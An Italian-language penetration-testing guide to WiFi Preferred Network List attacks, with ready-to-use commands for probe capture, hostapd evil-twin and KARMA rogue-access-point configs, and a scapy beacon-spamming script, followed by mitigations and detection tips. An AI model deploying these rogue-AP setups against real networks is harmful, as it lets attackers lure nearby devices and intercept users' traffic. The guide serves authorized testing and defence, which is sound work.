# PNL Attacks (Preferred Network List)

## Scopo

Questa guida copre gli attacchi che sfruttano la Preferred Network List (PNL), la lista di reti WiFi salvate sui dispositivi client che inviano probe request cercando SSID noti.

## Prerequisiti

- Scheda WiFi con monitor mode
- hostapd
- Kali Linux
- **Autorizzazione scritta** per i test

## Installazione

```bash
sudo apt-get install aircrack-ng hostapd
```

---

## Come Funziona

```
1. Client cerca reti salvate inviando Probe Request
2. Probe Request contiene SSID delle reti salvate
3. Attacker cattura probe e crea AP con SSID richiesto
4. Client si connette automaticamente
```

---

## Cattura Probe Requests

### Airodump-ng

```bash
# Monitor mode
sudo airmon-ng start wlan0

# Cattura probe
sudo airodump-ng wlan0mon

# Colonna "Probes" mostra SSID cercati
```

### Wireshark

```
# Filtro probe request
wlan.fc.type_subtype == 0x04

# Con SSID specifico
wlan.fc.type_subtype == 0x04 && wlan.ssid == "NetworkName"
```

### Tcpdump

```bash
sudo tcpdump -i wlan0mon -e -s 256 type mgt subtype probe-req
```

---

## Analisi PNL

```bash
# Estrai SSID dai probe
sudo airodump-ng --write-interval 1 -w probes wlan0mon

# Analizza con tshark
tshark -r probes-01.cap -Y "wlan.fc.type_subtype == 4" \
       -T fields -e wlan.sa -e wlan.ssid | sort -u
```

---

## Attacco

### Evil Twin su SSID Probed

```bash
# 1. Identifica SSID cercati
sudo airodump-ng wlan0mon
# Vedi probe per "CoffeeShopWiFi"

# 2. Crea AP con quel SSID
# /etc/hostapd/hostapd.conf
interface=wlan0
ssid=CoffeeShopWiFi
channel=6
auth_algs=1
wpa=0

# 3. Avvia
sudo hostapd /etc/hostapd/hostapd.conf
```

### KARMA Attack (Automatico)

Risponde a TUTTI i probe request:

```bash
# Hostapd-mana (fork con KARMA)
git clone https://github.com/sensepost/hostapd-mana.git
cd hostapd-mana

# hostapd-mana.conf
interface=wlan0
driver=nl80211
ssid=DefaultSSID
enable_mana=1
mana_loud=1

sudo ./hostapd hostapd-mana.conf
```

---

## WiFi Pineapple

```
# Hardware dedicato per PNL attacks
1. Abilita PineAP
2. Harvest SSID dai probe
3. Beacon Response automatico
4. Client si connette
```

---

## Attacchi Specifici

### Dirigible (Focused Attack)

```bash
# Target specifico dispositivo
# Cattura MAC address target
# Aspetta suoi probe
# Crea AP solo per quel SSID
```

### Beacon Stuffing

```python
from scapy.all import *

def beacon_spam(ssids, iface):
    for ssid in ssids:
        dot11 = Dot11(
            type=0, subtype=8,
            addr1="ff:ff:ff:ff:ff:ff",
            addr2=RandMAC(),
            addr3=RandMAC()
        )
        beacon = Dot11Beacon(cap='ESS+privacy')
        essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
        
        frame = RadioTap()/dot11/beacon/essid
        sendp(frame, iface=iface, inter=0.1)

ssids = ["FreeWiFi", "Starbucks", "Airport_WiFi"]
beacon_spam(ssids, "wlan0mon")
```

---

## Mitigazioni

### Per Utenti

- **Elimina reti non usate**: Pulisci PNL regolarmente
- **Disabilita auto-connect**: Per reti pubbliche
- **Usa VPN**: Proteggi traffico anche se AP malevolo
- **Verifica certificati**: Per reti enterprise

### Per Device

```
# iOS 14+: MAC randomization
# Android: Random MAC su reti non salvate
# Windows: Network profile management
```

### Per Organizzazioni

- **802.1X**: Autenticazione con certificati
- **EAP-TLS**: Verifica server certificate
- **MDM**: Gestione centralizzata profili WiFi
- **WIDS**: Rileva rogue AP

---

## Detection

```bash
# Rileva KARMA con script
# Verifica se AP risponde a SSID random

# Invia probe con SSID inesistente
# Se AP risponde = probabile KARMA
```

---

## Best Practices

- **Consenso**: Solo su dispositivi autorizzati
- **Lab isolato**: Evita interferenze
- **Documentazione**: Traccia SSID harvested
- **Privacy**: Non raccogliere dati oltre scope
- **Cleanup**: Rimuovi AP fake dopo test

## Riferimenti

- [KARMA Attack Paper](https://www.willhackforsushi.com/?p=1)
- [Hostapd-mana](https://github.com/sensepost/hostapd-mana)
- [WiFi Pineapple](https://www.wifipineapple.com/)
